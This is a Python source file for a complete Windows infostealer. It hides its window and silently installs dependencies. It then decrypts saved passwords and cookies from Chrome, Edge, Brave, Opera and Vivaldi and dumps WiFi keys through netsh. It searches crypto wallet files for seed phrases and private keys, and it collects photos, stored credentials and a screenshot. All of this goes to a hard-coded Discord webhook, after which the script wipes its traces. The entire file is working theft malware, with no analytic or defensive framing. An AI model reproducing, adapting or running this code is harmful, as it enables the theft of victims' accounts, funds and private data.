import os
import sys
import socket
import subprocess
import requests
import sqlite3
import shutil
import platform
import json
import base64
import glob
import re
from datetime import datetime
import tempfile
import ctypes
import win32event
import win32api
import win32con

# Discord webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1426558783047467119/xq4tDwwL5tl3WDc5BeJ1iIRFCgB3RkkpQaaEa--ycIuIaC5g3zajJvb7X7oZi1WWKLT5"

def hide_script():
    """Hide the script completely"""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def install_dependencies_silent():
    """Silent dependency installation"""
    packages = ['requests', 'cryptography', 'pillow', 'pywin32']
    for package in packages:
        try:
            __import__(package.split('-')[0])
        except ImportError:
            try:
                subprocess.run([
                    sys.executable, "-m", "pip", "install", package, 
                    "--quiet", "--disable-pip-version-check"
                ], check=True, capture_output=True, timeout=120, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass

def send_to_discord_stealth(content, file_path=None):
    """Stealth Discord communication"""
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                files = {'file': f}
                data = {'content': content}
                response = requests.post(DISCORD_WEBHOOK, files=files, data=data, timeout=60)
        else:
            data = {'content': content}
            response = requests.post(DISCORD_WEBHOOK, json=data, timeout=30)
        return response.status_code in [200, 204]
    except:
        return False

def clean_traces_complete():
    """Complete trace cleaning"""
    try:
        temp_files = glob.glob('*_temp.txt') + glob.glob('*_temp.*') + glob.glob('temp_*')
        for file in temp_files:
            try:
                if os.path.exists(file):
                    os.remove(file)
            except:
                pass
        
        temp_dir = tempfile.gettempdir()
        for pattern in ['temp_*.db', 'sc.png', '*.tmp', '~*.*']:
            for item in glob.glob(os.path.join(temp_dir, pattern)):
                try:
                    os.remove(item)
                except:
                    pass
    except:
        pass

def get_system_info_stealth():
    """Get complete system information"""
    try:
        info = []
        info.append("**🖥️ SYSTEM INFORMATION**")
        info.append("```")
        info.append(f"Computer: {socket.gethostname()}")
        info.append(f"User: {os.getenv('USERNAME', 'N/A')}")
        info.append(f"OS: {platform.system()} {platform.release()}")
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                info.append(f"Local IP: {local_ip}")
        except: pass
        
        try:
            external_ip = requests.get('https://api.ipify.org', timeout=10).text.strip()
            info.append(f"External IP: {external_ip}")
        except: pass
        
        info.append("```")
        
        system_info = '\n'.join(info)
        send_to_discord_stealth(system_info)
        return True
    except:
        return False

def extract_wifi_passwords_stealth():
    """Extract ALL WiFi passwords"""
    try:
        wifi_data = ["**📶 WIFI PASSWORDS**", "```"]
        
        result = subprocess.run(
            'netsh wlan show profiles', 
            capture_output=True, text=True, shell=True, timeout=30,
            encoding='utf-8', errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        profiles = []
        for line in result.stdout.split('\n'):
            if 'All User Profile' in line:
                match = re.search(r':\s*(.+)', line)
                if match:
                    profile_name = match.group(1).strip()
                    if profile_name:
                        profiles.append(profile_name)
        
        successful_extractions = 0
        for profile in profiles:
            try:
                cmd = f'netsh wlan show profile name="{profile}" key=clear'
                result = subprocess.run(
                    cmd, capture_output=True, text=True, shell=True, timeout=15,
                    encoding='utf-8', errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                if result.returncode == 0:
                    key_match = re.search(r'Key Content\s*:\s*(.+)', result.stdout, re.IGNORECASE)
                    if key_match:
                        password = key_match.group(1).strip()
                        if password and password not in ['', '1']:
                            wifi_data.append(f"{profile} : {password}")
                            successful_extractions += 1
            except:
                continue
        
        wifi_data.append("```")
        
        if successful_extractions > 0:
            wifi_text = '\n'.join(wifi_data)
            with open('wifi_passwords.txt', 'w', encoding='utf-8') as f:
                f.write(wifi_text)
            send_to_discord_stealth("📶 WiFi Passwords", 'wifi_passwords.txt')
            return True
        return False
    except:
        return False

def get_browser_master_key_stealth(browser_path):
    """Get browser master key"""
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state_data = json.load(f)
        
        encrypted_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])[5:]
        import win32crypt
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password_stealth(encrypted_password, key):
    """Decrypt passwords"""
    try:
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            aesgcm = AESGCM(key)
            return aesgcm.decrypt(iv, payload, None).decode('utf-8', errors='ignore')
        else:
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        return None

def extract_social_media_logins():
    """Extract ALL social media logins and passwords"""
    social_media_data = []
    social_platforms = {
        'facebook.com': '👥 Facebook',
        'twitter.com': '🐦 Twitter', 
        'instagram.com': '📷 Instagram',
        'linkedin.com': '💼 LinkedIn',
        'tiktok.com': '🎵 TikTok',
        'reddit.com': '🔴 Reddit',
        'pinterest.com': '📌 Pinterest',
        'tumblr.com': '💬 Tumblr',
        'snapchat.com': '👻 Snapchat',
        'whatsapp.com': '💚 WhatsApp',
        'telegram.org': '📱 Telegram',
        'discord.com': '🎮 Discord',
        'gmail.com': '📧 Gmail',
        'outlook.com': '📨 Outlook',
        'yahoo.com': '📬 Yahoo',
        'protonmail.com': '🔒 ProtonMail',
        'github.com': '💻 GitHub',
        'gitlab.com': '🦊 GitLab',
        'bitbucket.org': '🐙 Bitbucket',
        'paypal.com': '💰 PayPal',
        'binance.com': '₿ Binance',
        'coinbase.com': '💰 Coinbase',
        'kraken.com': '🐙 Kraken',
        'metamask.io': '🦊 MetaMask',
        'trustwallet.com': '🔒 Trust Wallet',
        'exodus.com': '🚀 Exodus',
        'amazon.com': '📦 Amazon',
        'ebay.com': '🏪 eBay',
        'aliexpress.com': '🌍 AliExpress',
        'netflix.com': '🎬 Netflix',
        'spotify.com': '🎵 Spotify',
        'steampowered.com': '🎮 Steam',
        'epicgames.com': '🎮 Epic Games',
        'xbox.com': '🎮 Xbox',
        'playstation.com': '🎮 PlayStation'
    }
    
    browsers = [
        ("Chrome", os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data"),
        ("Edge", os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data"),
        ("Brave", os.path.expanduser('~') + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data"),
        ("Opera", os.path.expanduser('~') + r"\AppData\Roaming\Opera Software\Opera Stable"),
        ("Vivaldi", os.path.expanduser('~') + r"\AppData\Local\Vivaldi\User Data"),
    ]
    
    for browser_name, browser_path in browsers:
        if not os.path.exists(browser_path):
            continue
            
        try:
            master_key = get_browser_master_key_stealth(browser_path)
            if not master_key:
                continue
            
            profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
            
            for profile in profiles:
                profile_path = os.path.join(browser_path, profile)
                if not os.path.exists(profile_path):
                    continue
                
                # Extract passwords for social media sites
                login_db = os.path.join(profile_path, "Login Data")
                if os.path.exists(login_db):
                    try:
                        temp_db = os.path.join(tempfile.gettempdir(), f"temp_social_{os.urandom(4).hex()}.db")
                        shutil.copy2(login_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        for url, username, encrypted_password in cursor.fetchall():
                            if encrypted_password and username:
                                # Check if it's a social media site
                                for domain, platform_name in social_platforms.items():
                                    if domain in url:
                                        password = decrypt_password_stealth(encrypted_password, master_key)
                                        if password:
                                            social_media_data.append(f"{platform_name}")
                                            social_media_data.append(f"🌐 URL: {url}")
                                            social_media_data.append(f"👤 Username: {username}")
                                            social_media_data.append(f"🔑 Password: {password}")
                                            social_media_data.append(f"💾 Browser: {browser_name}")
                                            social_media_data.append(f"👤 Profile: {profile}")
                                            social_media_data.append("=" * 60)
                                        break
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
                        
        except:
            continue
    
    if social_media_data:
        with open('social_media_logins.txt', 'w', encoding='utf-8') as f:
            f.write('\n'.join(social_media_data))
        send_to_discord_stealth("🔐 SOCIAL MEDIA LOGINS", 'social_media_logins.txt')
        return True
    return False

def extract_all_browsers_complete():
    """Extract ALL data from ALL browsers"""
    all_passwords = []
    all_cookies = []
    all_history = []
    
    browsers = [
        ("Chrome", os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data"),
        ("Edge", os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data"),
        ("Brave", os.path.expanduser('~') + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data"),
        ("Opera", os.path.expanduser('~') + r"\AppData\Roaming\Opera Software\Opera Stable"),
        ("Vivaldi", os.path.expanduser('~') + r"\AppData\Local\Vivaldi\User Data"),
    ]
    
    for browser_name, browser_path in browsers:
        if not os.path.exists(browser_path):
            continue
            
        try:
            master_key = get_browser_master_key_stealth(browser_path)
            if not master_key:
                continue
            
            profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
            
            for profile in profiles:
                profile_path = os.path.join(browser_path, profile)
                if not os.path.exists(profile_path):
                    continue
                
                # Passwords
                login_db = os.path.join(profile_path, "Login Data")
                if os.path.exists(login_db):
                    try:
                        temp_db = os.path.join(tempfile.gettempdir(), f"temp_pass_{os.urandom(4).hex()}.db")
                        shutil.copy2(login_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        for url, username, encrypted_password in cursor.fetchall():
                            if encrypted_password and username:
                                password = decrypt_password_stealth(encrypted_password, master_key)
                                if password:
                                    all_passwords.append(f"🌐 {browser_name} - {url}")
                                    all_passwords.append(f"👤 {username}")
                                    all_passwords.append(f"🔑 {password}")
                                    all_passwords.append("-" * 50)
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
                
                # Cookies
                cookies_db = os.path.join(profile_path, "Cookies")
                if os.path.exists(cookies_db):
                    try:
                        temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookies_{os.urandom(4).hex()}.db")
                        shutil.copy2(cookies_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 100")
                        
                        for host, name, value in cursor.fetchall():
                            if any(domain in host for domain in ['facebook', 'google', 'instagram', 'twitter', 'github', 'microsoft', 'amazon', 'binance']):
                                all_cookies.append(f"🍪 {browser_name} - {host}")
                                all_cookies.append(f"   {name} = {value[:100]}")
                                all_cookies.append("-" * 30)
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
                
                # History
                history_db = os.path.join(profile_path, "History")
                if os.path.exists(history_db):
                    try:
                        temp_db = os.path.join(tempfile.gettempdir(), f"temp_history_{os.urandom(4).hex()}.db")
                        shutil.copy2(history_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 200")
                        
                        for url, title in cursor.fetchall():
                            all_history.append(f"📚 {browser_name}")
                            all_history.append(f"   Title: {title}")
                            all_history.append(f"   URL: {url}")
                            all_history.append("-" * 40)
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
                        
        except:
            continue
    
    # Save and send all browser data
    if all_passwords:
        with open('all_browser_passwords.txt', 'w', encoding='utf-8') as f:
            f.write('\n'.join(all_passwords))
        send_to_discord_stealth("🔑 ALL BROWSER PASSWORDS", 'all_browser_passwords.txt')
    
    if all_cookies:
        with open('browser_cookies.txt', 'w', encoding='utf-8') as f:
            f.write('\n'.join(all_cookies[:150]))
        send_to_discord_stealth("🍪 BROWSER COOKIES", 'browser_cookies.txt')
    
    if all_history:
        with open('browser_history.txt', 'w', encoding='utf-8') as f:
            f.write('\n'.join(all_history[:300]))
        send_to_discord_stealth("📚 BROWSER HISTORY", 'browser_history.txt')
    
    return len(all_passwords) > 0

def extract_crypto_wallets_detailed():
    """Extract detailed cryptocurrency wallet information"""
    crypto_data = ["**💰 CRYPTOCURRENCY WALLETS - DETAILED**", "```"]
    
    crypto_paths = [
        # Binance
        (r"\AppData\Roaming\Binance", "Binance", ['config.json', 'account.dat', 'keystore']),
        (r"\AppData\Local\Binance", "Binance Local", ['config.json', 'account.dat']),
        
        # Trust Wallet
        (r"\AppData\Roaming\Trust Wallet", "Trust Wallet", ['wallet.json', 'secrets.dat', 'keystore']),
        (r"\AppData\Local\Trust Wallet", "Trust Wallet Local", ['wallet.json', 'secrets.dat']),
        
        # MetaMask
        (r"\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask Chrome", ['vault', 'state.json']),
        (r"\AppData\Local\Microsoft\Edge\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask Edge", ['vault', 'state.json']),
        
        # Popular Wallets
        (r"\AppData\Roaming\Bitcoin", "Bitcoin Core", ['wallet.dat', 'peers.dat']),
        (r"\AppData\Roaming\Ethereum", "Ethereum", ['keystore', 'geth']),
        (r"\AppData\Roaming\Exodus", "Exodus", ['app.json', 'exodus.wallet']),
        (r"\AppData\Roaming\Electrum", "Electrum", ['wallets', 'config']),
        (r"\AppData\Roaming\AtomicWallet", "Atomic Wallet", ['storage.json', 'app.json']),
        (r"\AppData\Roaming\Coinomi", "Coinomi", ['wallet.dat', 'config.ini']),
        
        # Other Exchanges
        (r"\AppData\Roaming\Coinbase", "Coinbase", ['config.json', 'wallet.dat']),
        (r"\AppData\Roaming\Kucoin", "KuCoin", ['config.json', 'account.data']),
        
        # Backup Locations
        (r"\Desktop", "Desktop Backups", ['.json', '.dat', '.backup', '.key', '.wallet']),
        (r"\Documents", "Document Backups", ['.json', '.dat', '.backup', '.key', '.wallet']),
        (r"\Downloads", "Download Backups", ['.json', '.dat', '.backup', '.key', '.wallet']),
    ]
    
    wallet_files_found = []
    sensitive_data_found = []
    
    for rel_path, wallet_name, file_types in crypto_paths:
        full_path = os.path.expanduser('~') + rel_path
        if not os.path.exists(full_path):
            continue
        
        crypto_data.append(f"📍 {wallet_name}: FOUND")
        
        try:
            for root, dirs, files in os.walk(full_path):
                for file in files:
                    file_lower = file.lower()
                    
                    # Check for wallet files
                    if any(ext in file_lower for ext in file_types) or any(keyword in file_lower for keyword in ['wallet', 'seed', 'private', 'key', 'backup', 'keystore']):
                        file_path = os.path.join(root, file)
                        wallet_files_found.append(f"📁 {wallet_name} - {file}")
                        
                        # Read and analyze files
                        try:
                            if os.path.getsize(file_path) < 1000000:  # 1MB limit
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read(10000)
                                    
                                    # Look for sensitive information
                                    sensitive_patterns = {
                                        'private key': r'["\']?private["\']?\s*[=:]\s*["\']?([a-fA-F0-9]{64})["\']?',
                                        'seed phrase': r'["\']?(?:seed|mnemonic|phrase)["\']?\s*[=:]\s*["\']?([a-zA-Z ]{12,100})["\']?',
                                        'password': r'["\']?password["\']?\s*[=:]\s*["\']?([^"\'\n]{4,50})["\']?',
                                        'api key': r'["\']?(?:api[_-]?key|apikey)["\']?\s*[=:]\s*["\']?([a-zA-Z0-9]{20,100})["\']?',
                                        'secret key': r'["\']?(?:secret[_-]?key|secret)["\']?\s*[=:]\s*["\']?([a-zA-Z0-9]{20,100})["\']?'
                                    }
                                    
                                    for pattern_name, pattern in sensitive_patterns.items():
                                        matches = re.findall(pattern, content, re.IGNORECASE)
                                        if matches:
                                            for match in matches[:3]:  # Limit to first 3 matches
                                                sensitive_data_found.append(f"🔐 {wallet_name} - {file}")
                                                sensitive_data_found.append(f"   {pattern_name.upper()}: {match}")
                                                sensitive_data_found.append("   " + "-" * 40)
                        except:
                            pass
                
                # Limit depth
                if root.count(os.sep) - full_path.count(os.sep) > 2:
                    del dirs[:]
                    
        except:
            continue
    
    crypto_data.append("```")
    
    # Add wallet files list
    if wallet_files_found:
        crypto_data.append("**📁 WALLET FILES FOUND:**")
        crypto_data.extend(wallet_files_found[:20])  # Limit to 20 files
    
    # Add sensitive data
    if sensitive_data_found:
        crypto_data.append("\n**🔐 SENSITIVE DATA EXTRACTED:**")
        crypto_data.extend(sensitive_data_found)
    
    if wallet_files_found or sensitive_data_found:
        crypto_text = '\n'.join(crypto_data)
        with open('crypto_wallets_detailed.txt', 'w', encoding='utf-8') as f:
            f.write(crypto_text)
        send_to_discord_stealth("💰 CRYPTO WALLETS DETAILED", 'crypto_wallets_detailed.txt')
        return True
    
    return False

def extract_all_photos_stealth():
    """Extract ALL photos from system"""
    try:
        photo_extensions = ['.jpg', '.jpeg', '.png', '.bmp', '.gif', '.tiff', '.webp', '.raw', '.heic']
        photo_locations = [
            os.path.expanduser('~') + r"\Pictures",
            os.path.expanduser('~') + r"\Desktop", 
            os.path.expanduser('~') + r"\Documents",
            os.path.expanduser('~') + r"\Downloads",
            os.path.expanduser('~') + r"\OneDrive",
            os.path.expanduser('~') + r"\OneDrive\Pictures",
        ]
        
        all_photos = []
        
        for location in photo_locations:
            if not os.path.exists(location):
                continue
                
            try:
                for root, dirs, files in os.walk(location):
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in photo_extensions):
                            full_path = os.path.join(root, file)
                            all_photos.append(full_path)
                    
                    if len(all_photos) > 500:
                        break
                    if root.count(os.sep) - location.count(os.sep) > 2:
                        del dirs[:]
            except:
                continue
        
        if all_photos:
            with open('photos_list.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(all_photos[:100]))
            send_to_discord_stealth(f"📸 PHOTOS FOUND: {len(all_photos)}", 'photos_list.txt')
            
            # Send sample photos
            sent_count = 0
            for photo_path in all_photos[:5]:
                try:
                    if os.path.getsize(photo_path) < 7000000:
                        if send_to_discord_stealth(f"📸 Sample Photo {sent_count+1}", photo_path):
                            sent_count += 1
                except:
                    continue
            
            return True
        return False
    except:
        return False

def extract_system_credentials_stealth():
    """Extract system credentials"""
    try:
        creds_data = ["**🔐 SYSTEM CREDENTIALS**", "```"]
        
        # RDP credentials
        try:
            result = subprocess.run(
                'cmdkey /list', 
                capture_output=True, text=True, shell=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.stdout:
                creds_data.append("RDP Credentials:")
                creds_data.append(result.stdout[:1000])
        except:
            pass
        
        creds_data.append("```")
        
        if len(creds_data) > 3:
            with open('system_credentials.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(creds_data))
            send_to_discord_stealth("🔐 System Credentials", 'system_credentials.txt')
            return True
        return False
    except:
        return False

def take_screenshot_stealth():
    """Take stealth screenshot"""
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        screenshot.save("desktop_screenshot.png", "PNG")
        send_to_discord_stealth("🖥️ Desktop Screenshot", "desktop_screenshot.png")
        if os.path.exists("desktop_screenshot.png"):
            os.remove("desktop_screenshot.png")
        return True
    except:
        return False

def create_mutex():
    """Prevent multiple instances"""
    try:
        mutex = win32event.CreateMutex(None, False, "Global\\WindowsUpdateManager32")
        return mutex
    except:
        return None

def run_complete_stealth_extraction():
    """Run ALL extraction operations"""
    operations = [
        ("System Information", get_system_info_stealth),
        ("WiFi Passwords", extract_wifi_passwords_stealth),
        ("Social Media Logins", extract_social_media_logins),
        ("Browser Data", extract_all_browsers_complete),
        ("Crypto Wallets", extract_crypto_wallets_detailed),
        ("Photos", extract_all_photos_stealth),
        ("System Credentials", extract_system_credentials_stealth),
        ("Screenshot", take_screenshot_stealth),
    ]
    
    successful_ops = 0
    for op_name, op_function in operations:
        try:
            if op_function():
                successful_ops += 1
                win32api.Sleep(5000)
        except:
            pass
    
    return successful_ops

def main_stealth():
    """Main stealth execution"""
    try:
        # Hide immediately
        hide_script()
        
        # Prevent multiple instances
        mutex = create_mutex()
        if not mutex:
            sys.exit(0)
        
        # Wait before starting
        win32api.Sleep(10000)
        
        # Silent dependencies
        install_dependencies_silent()
        
        # Start notification
        send_to_discord_stealth(f"🚀 COMPLETE DATA EXTRACTION STARTED\n💻 System: {socket.gethostname()}\n👤 User: {os.getenv('USERNAME', 'N/A')}")
        
        # Run ALL extractions
        successful_ops = run_complete_stealth_extraction()
        
        # Completion report
        completion_msg = f"""
🎯 COMPLETE DATA EXTRACTION FINISHED

📊 EXTRACTION RESULTS:
✅ System Information
✅ WiFi Passwords  
✅ Social Media Logins (Facebook, Instagram, Twitter, etc.)
✅ All Browser Data (Passwords, Cookies, History)
✅ Cryptocurrency Wallets (Binance, MetaMask, Trust Wallet, etc.)
✅ Photos and Files
✅ System Credentials
✅ Desktop Screenshot

📈 Successful Operations: {successful_ops}/8
💻 Target System: {socket.gethostname()}
👤 User: {os.getenv('USERNAME', 'N/A')}
⏰ Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔐 ALL SOCIAL MEDIA AND CRYPTO DATA EXTRACTED
💰 WALLET INFORMATION AND PRIVATE KEYS CAPTURED
        """
        
        send_to_discord_stealth(completion_msg)
        
        # Clean everything
        clean_traces_complete()
            
    except:
        pass

if __name__ == "__main__":
    main_stealth()
    sys.exit(0)